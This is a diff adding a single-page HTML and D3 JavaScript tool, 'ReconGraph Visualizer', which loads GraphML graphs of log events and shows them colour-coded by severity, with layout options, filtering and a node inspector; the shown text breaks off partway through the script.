@@ -1,0 +1,980 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ReconGraph Visualizer</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/d3/7.8.5/d3.min.js"></script>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+
+body {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+  font-size: 13px;
+  background: #f0f2f5;
+  color: #222;
+  height: 100vh;
+  overflow: hidden;
+  display: flex;
+  flex-direction: column;
+}
+
+/* HEADER */
+header {
+  background: #1a3a5c;
+  color: #fff;
+  padding: 0 16px;
+  height: 46px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  flex-shrink: 0;
+}
+.header-left { display: flex; align-items: center; gap: 10px; }
+.header-logo { font-size: 15px; font-weight: 600; }
+.header-logo span { color: #7ec8e3; }
+.header-version { font-size: 11px; color: #aac4d8; background: rgba(255,255,255,.12); padding: 2px 8px; border-radius: 10px; }
+.header-stats { display: flex; gap: 20px; }
+.hstat { font-size: 12px; color: #aac4d8; }
+.hstat strong { color: #fff; }
+.header-right { display: flex; gap: 6px; }
+.btn {
+  padding: 5px 13px; border-radius: 4px;
+  border: 1px solid rgba(255,255,255,.25);
+  background: transparent; color: #fff;
+  font-size: 12px; cursor: pointer; transition: background .15s;
+}
+.btn:hover { background: rgba(255,255,255,.1); }
+.btn.primary { background: #2980b9; border-color: #2471a3; }
+.btn.primary:hover { background: #2471a3; }
+
+/* WORKSPACE */
+.workspace { display: flex; flex: 1; overflow: hidden; }
+
+/* LEFT SIDEBAR */
+.sidebar {
+  width: 236px; flex-shrink: 0;
+  background: #fff; border-right: 1px solid #dde1e7;
+  display: flex; flex-direction: column; overflow: hidden;
+}
+.sb-section { padding: 12px 14px; border-bottom: 1px solid #eef0f3; }
+.sb-title {
+  font-size: 10px; font-weight: 700; text-transform: uppercase;
+  letter-spacing: .8px; color: #8a95a3; margin-bottom: 10px;
+}
+
+/* Upload */
+.upload-area {
+  border: 2px dashed #c8d0da; border-radius: 5px;
+  padding: 14px 10px; text-align: center; cursor: pointer;
+  transition: border-color .15s, background .15s; background: #f8f9fb;
+}
+.upload-area:hover, .upload-area.drag-over { border-color: #2980b9; background: #edf5fb; }
+.upload-area .ico { font-size: 20px; margin-bottom: 5px; }
+.upload-area p { font-size: 12px; color: #555; line-height: 1.5; }
+.upload-area small { font-size: 10px; color: #999; display: block; margin-top: 3px; }
+#file-input { display: none; }
+
+/* Form controls */
+.field { margin-bottom: 9px; }
+.field label { display: block; font-size: 11px; color: #666; margin-bottom: 4px; }
+select {
+  width: 100%; padding: 5px 7px;
+  border: 1px solid #c8d0da; border-radius: 4px;
+  background: #fff; font-size: 12px; color: #222;
+  cursor: pointer; outline: none;
+}
+select:focus { border-color: #2980b9; }
+
+.range-row { display: flex; justify-content: space-between; margin-bottom: 3px; }
+.range-val { font-size: 11px; color: #2980b9; font-weight: 600; }
+input[type=range] {
+  width: 100%; -webkit-appearance: none;
+  height: 4px; background: #dde1e7; border-radius: 2px; outline: none;
+}
+input[type=range]::-webkit-slider-thumb {
+  -webkit-appearance: none; width: 13px; height: 13px;
+  background: #2980b9; border-radius: 50%; cursor: pointer;
+}
+
+.check-row { display: flex; align-items: center; gap: 7px; margin-bottom: 7px; cursor: pointer; }
+.check-row input { width: 13px; height: 13px; cursor: pointer; accent-color: #2980b9; }
+.check-row label { font-size: 12px; color: #444; cursor: pointer; }
+
+/* Legend */
+.legend-row {
+  display: flex; align-items: center; gap: 8px;
+  margin-bottom: 6px; cursor: pointer; user-select: none;
+}
+.legend-row.muted { opacity: .3; }
+.leg-dot { width: 11px; height: 11px; border-radius: 50%; flex-shrink: 0; }
+.leg-label { flex: 1; font-size: 12px; color: #333; }
+.leg-count {
+  font-size: 11px; color: #777; background: #f0f2f5;
+  padding: 1px 6px; border-radius: 9px; min-width: 22px; text-align: center;
+}
+
+/* Search */
+.search-input {
+  width: 100%; padding: 6px 9px;
+  border: 1px solid #c8d0da; border-radius: 4px;
+  font-size: 12px; outline: none; transition: border-color .15s;
+}
+.search-input:focus { border-color: #2980b9; }
+
+/* Node list */
+.node-list { flex: 1; overflow-y: auto; padding: 6px; }
+.node-list::-webkit-scrollbar { width: 5px; }
+.node-list::-webkit-scrollbar-thumb { background: #dde1e7; border-radius: 3px; }
+.node-item {
+  padding: 7px 9px; border-radius: 4px; margin-bottom: 3px;
+  cursor: pointer; border: 1px solid transparent; transition: background .12s;
+}
+.node-item:hover { background: #f0f4f8; }
+.node-item.active { background: #edf5fb; border-color: #9cc4e0; }
+.node-name { font-size: 12px; color: #222; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; margin-bottom: 3px; }
+.node-meta { display: flex; gap: 6px; align-items: center; }
+.sev-pill { font-size: 10px; font-weight: 600; padding: 1px 6px; border-radius: 9px; text-transform: capitalize; }
+.node-cnt { font-size: 10px; color: #999; }
+
+/* CANVAS */
+.canvas-area { flex: 1; position: relative; overflow: hidden; background: #f7f8fa; }
+#graph-svg { width: 100%; height: 100%; cursor: grab; }
+#graph-svg:active { cursor: grabbing; }
+
+/* Empty state */
+.empty-state {
+  position: absolute; inset: 0;
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  gap: 10px; pointer-events: none;
+}
+.empty-state .ico { font-size: 38px; opacity: .25; }
+.empty-state h3 { font-size: 15px; font-weight: 600; color: #aaa; }
+.empty-state p { font-size: 12px; color: #bbb; text-align: center; max-width: 280px; line-height: 1.6; }
+.empty-state button {
+  pointer-events: all; padding: 8px 18px;
+  background: #2980b9; color: #fff; border: none;
+  border-radius: 4px; font-size: 13px; cursor: pointer; margin-top: 4px;
+}
+.empty-state button:hover { background: #2471a3; }
+
+/* Summary overlay */
+.summary-bar {
+  position: absolute; top: 12px; left: 12px;
+  background: #fff; border: 1px solid #dde1e7;
+  border-radius: 5px; padding: 8px 14px;
+  box-shadow: 0 1px 4px rgba(0,0,0,.06);
+  display: none; gap: 20px;
+}
+.summary-bar.visible { display: flex; }
+.sum-item { display: flex; flex-direction: column; align-items: center; gap: 1px; }
+.sum-val { font-size: 16px; font-weight: 700; color: #1a3a5c; line-height: 1; }
+.sum-label { font-size: 10px; color: #999; }
+
+/* Toolbar */
+.graph-toolbar {
+  position: absolute; bottom: 16px; left: 50%; transform: translateX(-50%);
+  display: flex; align-items: center; gap: 2px;
+  background: #fff; border: 1px solid #dde1e7;
+  border-radius: 6px; padding: 4px;
+  box-shadow: 0 1px 4px rgba(0,0,0,.08);
+}
+.tbtn {
+  width: 28px; height: 28px; display: flex; align-items: center; justify-content: center;
+  background: transparent; border: none; border-radius: 4px;
+  cursor: pointer; font-size: 14px; color: #555; transition: background .12s;
+}
+.tbtn:hover { background: #f0f2f5; }
+.tbtn.active { background: #edf5fb; color: #2980b9; }
+.tb-sep { width: 1px; height: 20px; background: #eef0f3; margin: 0 2px; }
+.zoom-pct { font-size: 11px; color: #777; padding: 0 6px; min-width: 38px; text-align: center; }
+
+/* RIGHT PANEL */
+.right-panel {
+  width: 256px; flex-shrink: 0;
+  background: #fff; border-left: 1px solid #dde1e7;
+  display: flex; flex-direction: column; overflow: hidden;
+}
+.rp-header {
+  padding: 12px 14px; border-bottom: 1px solid #eef0f3;
+  font-size: 10px; font-weight: 700; text-transform: uppercase;
+  letter-spacing: .8px; color: #8a95a3;
+}
+.rp-empty {
+  flex: 1; display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  gap: 8px; color: #bbb; font-size: 12px; text-align: center; padding: 20px;
+}
+.rp-empty .ico { font-size: 26px; opacity: .35; }
+.rp-body { flex: 1; overflow-y: auto; display: none; }
+.rp-body.visible { display: block; }
+.rp-body::-webkit-scrollbar { width: 5px; }
+.rp-body::-webkit-scrollbar-thumb { background: #dde1e7; }
+
+.rp-node-title { padding: 12px 14px 10px; border-bottom: 1px solid #eef0f3; }
+.rp-node-name { font-size: 13px; font-weight: 600; color: #1a3a5c; line-height: 1.4; margin-bottom: 6px; word-break: break-word; }
+
+.rp-section { padding: 10px 14px; border-bottom: 1px solid #eef0f3; }
+.rp-sec-title { font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: .7px; color: #aaa; margin-bottom: 8px; }
+
+.prop-row { display: flex; gap: 8px; margin-bottom: 5px; align-items: flex-start; }
+.prop-key { font-size: 11px; color: #999; width: 76px; flex-shrink: 0; padding-top: 1px; }
+.prop-val { font-size: 12px; color: #333; flex: 1; word-break: break-word; }
+.prop-val.mono { font-family: "Courier New", monospace; font-size: 10px; }
+
+.edge-item {
+  display: flex; align-items: center; gap: 7px;
+  padding: 5px 8px; background: #f8f9fb;
+  border-radius: 4px; margin-bottom: 4px;
+}
+.edge-dir { font-size: 11px; color: #999; }
+.edge-nm { flex: 1; font-size: 11px; color: #333; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.edge-w { font-size: 11px; font-weight: 600; color: #2980b9; background: #edf5fb; padding: 1px 6px; border-radius: 3px; }
+
+.log-box {
+  font-family: "Courier New", monospace; font-size: 10px; color: #444;
+  background: #f5f6f8; border: 1px solid #e0e3e8;
+  border-radius: 4px; padding: 8px; line-height: 1.6;
+  white-space: pre-wrap; word-break: break-all;
+  max-height: 120px; overflow-y: auto;
+}
+
+/* Severity */
+.sev-critical { background: #fde8ec; color: #c0392b; }
+.sev-high     { background: #fef3e2; color: #d35400; }
+.sev-medium   { background: #fefbe6; color: #b7950b; }
+.sev-low      { background: #e8f6ef; color: #1e8449; }
+.sev-unknown  { background: #f0f2f5; color: #7f8c8d; }
+.dot-critical { background: #e74c3c; }
+.dot-high     { background: #e67e22; }
+.dot-medium   { background: #f1c40f; }
+.dot-low      { background: #27ae60; }
+.dot-unknown  { background: #95a5a6; }
+
+/* Toast */
+.toast {
+  position: fixed; bottom: 60px; left: 50%;
+  transform: translateX(-50%) translateY(8px);
+  background: #333; color: #fff;
+  padding: 7px 16px; border-radius: 20px;
+  font-size: 12px; opacity: 0; transition: all .25s;
+  pointer-events: none; z-index: 999;
+}
+.toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="header-left">
+    <div class="header-logo">Recon<span>Graph</span> Visualizer</div>
+    <span class="header-version">v0.0.3</span>
+  </div>
+  <div class="header-stats" id="header-stats" style="display:none">
+    <span class="hstat">Nodes: <strong id="s-nodes">0</strong></span>
+    <span class="hstat">Edges: <strong id="s-edges">0</strong></span>
+    <span class="hstat">Critical: <strong id="s-crit" style="color:#ff8a80">0</strong></span>
+    <span class="hstat">High: <strong id="s-high" style="color:#ffcc80">0</strong></span>
+  </div>
+  <div class="header-right">
+    <button class="btn" onclick="exportSVG()">Export SVG</button>
+    <button class="btn" onclick="exportJSON()">Export JSON</button>
+    <label class="btn primary" for="file-input">Load GraphML</label>
+  </div>
+</header>
+
+<div class="workspace">
+
+  <!-- SIDEBAR -->
+  <div class="sidebar">
+
+    <div class="sb-section">
+      <div class="sb-title">Load File</div>
+      <div class="upload-area" id="upload-area" onclick="document.getElementById('file-input').click()">
+        <div class="ico">📂</div>
+        <p>Click or drag a GraphML file here</p>
+        <small>reconstruction_edge_graph.graphml</small>
+      </div>
+      <input type="file" id="file-input" accept=".graphml,.xml">
+    </div>
+
+    <div class="sb-section">
+      <div class="sb-title">Layout</div>
+      <div class="field">
+        <label>Algorithm</label>
+        <select id="layout-sel" onchange="changeLayout()">
+          <option value="force">Force-Directed</option>
+          <option value="circular">Circular</option>
+          <option value="hierarchical">Hierarchical</option>
+          <option value="radial">Radial</option>
+        </select>
+      </div>
+      <div class="field">
+        <div class="range-row">
+          <label>Link Distance</label>
+          <span class="range-val" id="dist-val">120</span>
+        </div>
+        <input type="range" id="dist-sl" min="40" max="300" value="120" oninput="onSlider()">
+      </div>
+      <div class="field">
+        <div class="range-row">
+          <label>Repulsion</label>
+          <span class="range-val" id="charge-val">300</span>
+        </div>
+        <input type="range" id="charge-sl" min="50" max="800" value="300" oninput="onSlider()">
+      </div>
+    </div>
+
+    <div class="sb-section">
+      <div class="sb-title">Display</div>
+      <div class="check-row">
+        <input type="checkbox" id="chk-labels" checked onchange="toggleLabels()">
+        <label for="chk-labels">Show node labels</label>
+      </div>
+      <div class="check-row">
+        <input type="checkbox" id="chk-weights" onchange="toggleWeights()">
+        <label for="chk-weights">Show edge weights</label>
+      </div>
+    </div>
+
+    <div class="sb-section">
+      <div class="sb-title">Filter by Severity</div>
+      <div class="legend-row" data-sev="critical" onclick="toggleSev('critical')">
+        <div class="leg-dot dot-critical"></div>
+        <span class="leg-label">Critical</span>
+        <span class="leg-count" id="cnt-critical">0</span>
+      </div>
+      <div class="legend-row" data-sev="high" onclick="toggleSev('high')">
+        <div class="leg-dot dot-high"></div>
+        <span class="leg-label">High</span>
+        <span class="leg-count" id="cnt-high">0</span>
+      </div>
+      <div class="legend-row" data-sev="medium" onclick="toggleSev('medium')">
+        <div class="leg-dot dot-medium"></div>
+        <span class="leg-label">Medium</span>
+        <span class="leg-count" id="cnt-medium">0</span>
+      </div>
+      <div class="legend-row" data-sev="low" onclick="toggleSev('low')">
+        <div class="leg-dot dot-low"></div>
+        <span class="leg-label">Low</span>
+        <span class="leg-count" id="cnt-low">0</span>
+      </div>
+      <div class="legend-row" data-sev="unknown" onclick="toggleSev('unknown')">
+        <div class="leg-dot dot-unknown"></div>
+        <span class="leg-label">Unknown</span>
+        <span class="leg-count" id="cnt-unknown">0</span>
+      </div>
+    </div>
+
+    <div class="sb-section">
+      <div class="sb-title">Search</div>
+      <input class="search-input" type="text" id="search-box" placeholder="Filter nodes..." oninput="filterNodes()">
+    </div>
+
+    <div class="node-list" id="node-list">
+      <div style="color:#bbb;font-size:12px;text-align:center;padding:14px 0">No data loaded</div>
+    </div>
+
+  </div>
+
+  <!-- CANVAS -->
+  <div class="canvas-area" id="canvas-area">
+    <svg id="graph-svg"></svg>
+
+    <div class="empty-state" id="empty-state">
+      <div class="ico">🕸️</div>
+      <h3>No Graph Loaded</h3>
+      <p>Upload a <code>reconstruction_edge_graph.graphml</code> file from ReconGraph to start visualizing.</p>
+      <button onclick="loadSample()">Load Sample Graph</button>
+    </div>
+
+    <div class="summary-bar" id="summary-bar">
+      <div class="sum-item"><span class="sum-val" id="sum-nodes">0</span><span class="sum-label">Nodes</span></div>
+      <div class="sum-item"><span class="sum-val" id="sum-edges">0</span><span class="sum-label">Edges</span></div>
+      <div class="sum-item"><span class="sum-val" id="sum-first" style="font-size:11px">—</span><span class="sum-label">First Event</span></div>
+      <div class="sum-item"><span class="sum-val" id="sum-last" style="font-size:11px">—</span><span class="sum-label">Last Event</span></div>
+    </div>
+
+    <div class="graph-toolbar">
+      <button class="tbtn" onclick="zoomIn()" title="Zoom in">+</button>
+      <span class="zoom-pct" id="zoom-pct">100%</span>
+      <button class="tbtn" onclick="zoomOut()" title="Zoom out">−</button>
+      <div class="tb-sep"></div>
+      <button class="tbtn" onclick="fitView()" title="Fit to screen">⊡</button>
+      <div class="tb-sep"></div>
+      <button class="tbtn" id="btn-freeze" onclick="toggleFreeze()" title="Freeze/unfreeze layout">❄</button>
+    </div>
+  </div>
+
+  <!-- RIGHT PANEL -->
+  <div class="right-panel">
+    <div class="rp-header">Node Inspector</div>
+    <div class="rp-empty" id="rp-empty">
+      <div class="ico">🔍</div>
+      <div>Click a node to view its details</div>
+    </div>
+    <div class="rp-body" id="rp-body">
+      <div class="rp-node-title">
+        <div class="rp-node-name" id="d-name"></div>
+        <span class="sev-pill" id="d-pill"></span>
+      </div>
+      <div class="rp-section">
+        <div class="rp-sec-title">Properties</div>
+        <div class="prop-row"><span class="prop-key">Event ID</span><span class="prop-val mono" id="d-id"></span></div>
+        <div class="prop-row"><span class="prop-key">Severity</span><span class="prop-val" id="d-sev"></span></div>
+        <div class="prop-row"><span class="prop-key">Log count</span><span class="prop-val" id="d-count"></span></div>
+        <div class="prop-row"><span class="prop-key">Timestamp</span><span class="prop-val mono" id="d-ts"></span></div>
+        <div class="prop-row"><span class="prop-key">In / Out</span><span class="prop-val" id="d-degree"></span></div>
+      </div>
+      <div class="rp-section">
+        <div class="rp-sec-title">Outgoing Transitions</div>
+        <div id="d-out"></div>
+      </div>
+      <div class="rp-section">
+        <div class="rp-sec-title">Incoming Transitions</div>
+        <div id="d-in"></div>
+      </div>
+      <div class="rp-section">
+        <div class="rp-sec-title">Log Snippet</div>
+        <div class="log-box" id="d-snippet"></div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+// ── State ──
+let graphData = null, sim = null;
+let svgSel, gSel, zoomB;
+let curZoom = 1;
+let frozen = false;
+let hiddenSev = new Set();
+let selectedId = null;
+
+const SEV_COLOR = {
+  critical: '#e74c3c', high: '#e67e22',
+  medium: '#f1c40f', low: '#27ae60', unknown: '#95a5a6'
+};
+
+function normSev(s) {
+  if (!s) return 'unknown';
+  const l = s.toLowerCase();
+  if (l.includes('critical')) return 'critical';
+  if (l.includes('high'))     return 'high';
+  if (l.includes('medium'))   return 'medium';
+  if (l.includes('low'))      return 'low';
+  return 'unknown';
+}
+
+// ── SVG Init ──
+function initSVG() {
+  svgSel = d3.select('#graph-svg');
+  svgSel.selectAll('*').remove();
+
+  const defs = svgSel.append('defs');
+  ['def','hi'].forEach(id => {
+    defs.append('marker')
+      .attr('id','arr-'+id)
+      .attr('viewBox','0 -4 8 8').attr('refX',20).attr('refY',0)
+      .attr('markerWidth',6).attr('markerHeight',6).attr('orient','auto')
+      .append('path').attr('d','M0,-4L8,0L0,4')
+      .attr('fill', id==='hi' ? '#2980b9' : '#bbb');
+  });
+
+  gSel = svgSel.append('g');
+  zoomB = d3.zoom().scaleExtent([0.05, 4]).on('zoom', e => {
+    gSel.attr('transform', e.transform);
+    curZoom = e.transform.k;
+    document.getElementById('zoom-pct').textContent = Math.round(curZoom * 100) + '%';
+  });
+  svgSel.call(zoomB);
+}
+
+// ── Parse GraphML ──
+function parseGraphML(xml) {
+  const doc = new DOMParser().parseFromString(xml, 'application/xml');
+  const keys = {};
+  doc.querySelectorAll('key').forEach(k => {
+    keys[k.getAttribute('id')] = k.getAttribute('attr.name') || k.getAttribute('id');
+  });
+  function getAttrs(el) {
+    const o = {};
+    el.querySelectorAll('data').forEach(d => {
+      o[keys[d.getAttribute('key')] || d.getAttribute('key')] = d.textContent.trim();
+    });
+    return o;
+  }
+  const nodes = [];
+  doc.querySelectorAll('node').forEach(n => {
+    const id = n.getAttribute('id');
+    const a = getAttrs(n);
+    nodes.push({
+      id,
+      label: a.label || a.sigma || a.event || id,
+      level: normSev(a.level || a.severity || a.sigma_level || ''),
+      count: parseInt(a.count || a.log_count || '1') || 1,
+      timestamp: a.timestamp || a.datetime || '',
+      snippet: a.snippet || a.message || a.log_snippet || '',
+      ...a
+    });
+  });
+  const edges = [];
+  doc.querySelectorAll('edge').forEach(e => {
+    const a = getAttrs(e);
+    edges.push({
+      source: e.getAttribute('source'),
+      target: e.getAttribute('target'),
+      weight: parseFloat(a.weight || a.count || '1') || 1,
+      ...a
+    });
+  });
+  return { nodes, edges };
+}
+
+// ── Render ──
+function renderGraph(data) {
+  graphData = data;
+  initSVG();
+  document.getElementById('empty-state').style.display = 'none';
+  document.getElementById('summary-bar').classList.add('visible');
+  document.getElementById('header-stats').style.display = 'flex';
+  updateStats(data);
+  buildNodeList(data);
+  applyLayout(data, document.getElementById('layout-sel').value);
+}
+
+function applyLayout(data, layout) {
+  const area = document.getElementById('canvas-area');
+  const W = area.clientWidth, H = area.clientHeight;
+  const nodes = data.nodes.map(d => ({ ...d }));
+  const edges = data.edges.map(d => ({ ...d }));
+  gSel.selectAll('*').remove();
+
+  // Pre-position nodes
+  if (layout === 'circular') {
+    const r = Math.min(W, H) * 0.36;
+    nodes.forEach((n, i) => {
+      const a = (i / nodes.length) * 2 * Math.PI - Math.PI / 2;
+      n.x = W/2 + r * Math.cos(a);
+      n.y = H/2 + r * Math.sin(a);
+      n.fx = n.x; n.fy = n.y;
+    });
+  } else if (layout === 'hierarchical') {
+    const adj = {}; nodes.forEach(n => adj[n.id] = []);
+    edges.forEach(e => { if (adj[e.source]) adj[e.source].push(e.target); });
+    const roots = new Set(nodes.map(n => n.id));
+    edges.forEach(e => roots.delete(e.target));
+    const levels = {}, vis = new Set();
+    const q = [...roots].map(id => ({ id, l: 0 }));
+    while (q.length) {
+      const { id, l } = q.shift();
+      if (vis.has(id)) continue;
+      vis.add(id); levels[id] = l;
+      (adj[id] || []).forEach(t => q.push({ id: t, l: l + 1 }));
+    }
+    nodes.forEach(n => { if (levels[n.id] === undefined) levels[n.id] = 0; });
+    const maxL = Math.max(...Object.values(levels));
+    const byL = {};
+    nodes.forEach(n => { const l = levels[n.id]; (byL[l] = byL[l] || []).push(n); });
+    Object.entries(byL).forEach(([l, ns]) => {
+      const y = H / (maxL + 2) * (+l + 1);
+      ns.forEach((n, i) => { n.x = W / (ns.length + 1) * (i + 1); n.y = y; });
+    });
+  } else if (layout === 'radial') {
+    const deg = {};
+    nodes.forEach(n => deg[n.id] = 0);
+    edges.forEach(e => { deg[e.source] = (deg[e.source]||0) + 1; deg[e.target] = (deg[e.target]||0) + 1; });
+    const sorted = [...nodes].sort((a, b) => (deg[b.id]||0) - (deg[a.id]||0));
+    sorted[0].x = W/2; sorted[0].y = H/2;
+    const r = Math.min(W, H) * 0.35;
+    sorted.slice(1).forEach((n, i) => {
+      const a = (i / (sorted.length - 1 || 1)) * 2 * Math.PI;
+      n.x = W/2 + r * Math.cos(a); n.y = H/2 + r * Math.sin(a);
+    });
+  } else {
+    nodes.forEach(n => { n.x = W/2 + (Math.random()-.5)*200; n.y = H/2 + (Math.random()-.5)*200; });
+  }
+
+  const maxW = Math.max(...edges.map(e => e.weight), 1);
+
+  // Links
+  const linkG = gSel.append('g').attr('class', 'links');
+  const linkSel = linkG.selectAll('path').data(edges).enter().append('path')
+    .attr('fill', 'none')
+    .attr('stroke', '#bbb')
+    .attr('stroke-width', d => 1 + (d.weight / maxW) * 3)
+    .attr('marker-end', 'url(#arr-def)');
+
+  // Weight labels
+  const wG = gSel.append('g').attr('class', 'wlabels')
+    .style('display', document.getElementById('chk-weights').checked ? '' : 'none');
+  const wSel = wG.selectAll('text').data(edges).enter().append('text')
+    .attr('text-anchor', 'middle').attr('font-size', 10)
+    .attr('fill', '#999').attr('font-family', 'inherit')
+    .text(d => d.weight);
+
+  // Nodes
+  const nodeG = gSel.append('g').attr('class', 'nodes');
+  const nodeSel = nodeG.selectAll('g').data(nodes).enter().append('g')
+    .attr('class', 'node').style('cursor', 'pointer')
+    .call(d3.drag().on('start', ds).on('drag', dd).on('end', de))
+    .on('click', (e, d) => { e.stopPropagation(); selectNode(d, nodeSel, linkSel, nodes, edges); });
+
+  function nodeR(d) { return Math.max(10, Math.min(28, 10 + Math.log((d.count||1) + 1) * 4)); }
+
+  nodeSel.append('circle')
+    .attr('r', nodeR)
+    .attr('fill', d => { const c = d3.color(SEV_COLOR[d.level] || '#95a5a6'); c.opacity = .18; return c + ''; })
+    .attr('stroke', d => SEV_COLOR[d.level] || '#95a5a6')
+    .attr('stroke-width', 2);
+
+  nodeSel.append('text')
+    .attr('class', 'nlabel').attr('text-anchor', 'middle')
+    .attr('dy', d => nodeR(d) + 13)
+    .attr('font-size', 11).attr('fill', '#333').attr('font-family', 'inherit')
+    .style('display', document.getElementById('chk-labels').checked ? '' : 'none')
+    .each(function(d) {
+      const lbl = d.label || d.id;
+      d3.select(this).text(lbl.length > 20 ? lbl.slice(0, 20) + '…' : lbl);
+    });
+
+  function findN(id) { return typeof id === 'object' ? id : nodes.find(n => n.id === id); }
+
+  function tick() {
+    linkSel.attr('d', d => {
+      const s = findN(d.source), t = findN(d.target);
+      if (!s || !t) return '';
+      if (s.id === t.id) {
+        const r = nodeR(s) + 12;
+        return `M${s.x},${s.y} C${s.x+r*2},${s.y-r*2} ${s.x+r*2},${s.y+r*2} ${s.x},${s.y}`;
+      }
+      const dx = t.x-s.x, dy = t.y-s.y, dist = Math.sqrt(dx*dx+dy*dy) || 1;
+      const cx = (s.x+t.x)/2 - dy/dist*22, cy = (s.y+t.y)/2 + dx/dist*22;
+      return `M${s.x},${s.y} Q${cx},${cy} ${t.x},${t.y}`;
+    });
+    wSel.attr('x', d => { const s=findN(d.source),t=findN(d.target); return s&&t?(s.x+t.x)/2:0; })
+        .attr('y', d => { const s=findN(d.source),t=findN(d.target); return s&&t?(s.y+t.y)/2:0; });
+    nodeSel.attr('transform', d => `translate(${d.x||0},${d.y||0})`);
+  }
+
+  if (layout === 'force') {
+    const dist = +document.getElementById('dist-sl').value;
+    const charge = -document.getElementById('charge-sl').value;
+    sim = d3.forceSimulation(nodes)
+      .force('link', d3.forceLink(edges).id(d => d.id).distance(dist))
+      .force('charge', d3.forceManyBody().strength(charge))
+      .force('center', d3.forceCenter(W/2, H/2))
+      .force('collide', d3.forceCollide(d => nodeR(d) + 6))
+      .on('tick', tick);
+  } else {
+    tick();
+    if (sim) { sim.stop(); sim = null; }
+  }
+
+  applySevFilter();
+
+  // Deselect on canvas click
+  svgSel.on('click', () => {
+    if (!selectedId) return;
+    selectedId = null;
+    nodeSel.attr('opacity', 1);
+    linkSel.attr('stroke', '#bbb').attr('marker-end', 'url(#arr-def)');
+    document.getElementById('rp-empty').style.display = 'flex';
+    document.getElementById('rp-body').classList.remove('visible');
+    document.querySelectorAll('.node-item').forEach(el => el.classList.remove('active'));
+  });
+
+  function selectNode(d, nSel, lSel, nodeArr, edgeArr) {
+    selectedId = d.id;
+    showDetail(d, edgeArr);
+    const conn = new Set([d.id]);
+    edgeArr.forEach(e => {
+      const s = typeof e.source==='object' ? e.source.id : e.source;
+      const t = typeof e.target==='object' ? e.target.id : e.target;
+      if (s === d.id) conn.add(t);
+      if (t === d.id) conn.add(s);
+    });
+    nSel.attr('opacity', n => conn.has(n.id) ? 1 : 0.2);
+    lSel.attr('stroke', e => {
+      const s = typeof e.source==='object' ? e.source.id : e.source;
+      const t = typeof e.target==='object' ? e.target.id : e.target;
+      return (s===d.id || t===d.id) ? '#2980b9' : '#e0e3e8';
+    }).attr('marker-end', e => {
+      const s = typeof e.source==='object' ? e.source.id : e.source;
+      const t = typeof e.target==='object' ? e.target.id : e.target;
+      return (s===d.id || t===d.id) ? 'url(#arr-hi)' : 'url(#arr-def)';
+    });
+    document.querySelectorAll('.node-item').forEach(el => el.classList.remove('active'));
+    const li = document.querySelector(`.node-item[data-id="${d.id}"]`);
+    if (li) { li.classList.add('active'); li.scrollIntoView({ block: 'nearest' }); }
+  }
+
+  // List click → pan to node
+  window._selectById = id => {
+    const nd = nodes.find(n => n.id === id);
+    if (!nd) return;
+    selectNode(nd, nodeSel, linkSel, nodes, edges);
+    const area2 = document.getElementById('canvas-area');
+    const W2 = area2.clientWidth, H2 = area2.clientHeight;
+    svgSel.transition().duration(400).call(
+      zoomB.transform,
+      d3.zoomIdentity.translate(W2/2 - (nd.x||0)*curZoom, H2/2 - (nd.y||0)*curZoom).scale(curZoom)
+    );
+  };
+
+  function ds(e, d) { if (!frozen && sim) sim.alphaTarget(.3).restart(); d.fx = d.x; d.fy = d.y; }
+  function dd(e, d) { d.fx = e.x; d.fy = e.y; }
+  function de(e, d) { if (!frozen && sim) sim.alphaTarget(0); if (!frozen) { d.fx = null; d.fy = null; } }
+}
+
+// ── Detail panel ──
+function showDetail(d, edges) {
+  document.getElementById('rp-empty').style.display = 'none';
+  document.getElementById('rp-body').classList.add('visible');
+
+  document.getElementById('d-name').textContent = d.label || d.id;
+  const sev = d.level || 'unknown';
+  document.getElementById('d-pill').textContent = sev.charAt(0).toUpperCase() + sev.slice(1);
+  document.getElementById('d-pill').className = 'sev-pill sev-' + sev;
+  document.getElementById('d-id').textContent = d.id;
+  document.getElementById('d-sev').textContent = sev.charAt(0).toUpperCase() + sev.slice(1);
+  document.getElementById('d-count').textContent = (d.count || 1) + ' log entries';
+  document.getElementById('d-ts').textContent = d.timestamp || '—';
+  document.getElementById('d-snippet').textContent = d.snippet || '—';
+
+  const allEdges = edges || graphData?.edges || [];
+  const getId = x => typeof x === 'object' ? x.id : x;
+  const outE = allEdges.filter(e => getId(e.source) === d.id);
+  const inE  = allEdges.filter(e => getId(e.target) === d.id);
+  document.getElementById('d-degree').textContent = `${inE.length} in, ${outE.length} out`;
+
+  function mkEdge(nameId, w, dir) {
+    const node = graphData.nodes.find(n => n.id === nameId);
+    const lbl = node?.label || nameId;
+    return `<div class="edge-item"><span class="edge-dir">${dir}</span><span class="edge-nm" title="${lbl}">${lbl.length>22?lbl.slice(0,22)+'…':lbl}</span><span class="edge-w">×${w}</span></div>`;
+  }
+
+  document.getElementById('d-out').innerHTML = outE.length
+    ? outE.slice(0,8).map(e => mkEdge(getId(e.target), e.weight, '→')).join('')
+    : '<div style="font-size:11px;color:#bbb">None</div>';
+
+  document.getElementById('d-in').innerHTML = inE.length
+    ? inE.slice(0,8).map(e => mkEdge(getId(e.source), e.weight, '←')).join('')
+    : '<div style="font-size:11px;color:#bbb">None</div>';
+}
+
+// ── Controls ──
+function onSlider() {
+  document.getElementById('dist-val').textContent = document.getElementById('dist-sl').value;
+  document.getElementById('charge-val').textContent = document.getElementById('charge-sl').value;
+  if (sim) {
+    sim.force('link').distance(+document.getElementById('dist-sl').value);
+    sim.force('charge').strength(-document.getElementById('charge-sl').value);
+    sim.alpha(.3).restart();
+  }
+}
+
+function changeLayout() { if (graphData) renderGraph(graphData); }
